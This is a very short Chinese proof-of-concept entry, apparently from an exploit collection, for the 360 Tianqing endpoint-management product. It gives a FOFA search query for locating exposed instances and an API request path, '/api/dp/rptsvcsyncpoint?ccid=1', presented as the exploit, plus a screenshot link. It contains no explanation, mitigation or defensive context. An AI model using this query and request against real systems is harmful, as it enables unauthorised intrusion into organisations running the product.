### 描述
fofa title="360新天擎"

### POC & 利用
`/api/dp/rptsvcsyncpoint?ccid=1`

![Snipaste_2021-04-12_11-52-50.png](https://i.loli.net/2021/04/12/964vIOdVAgZPb5H.png)
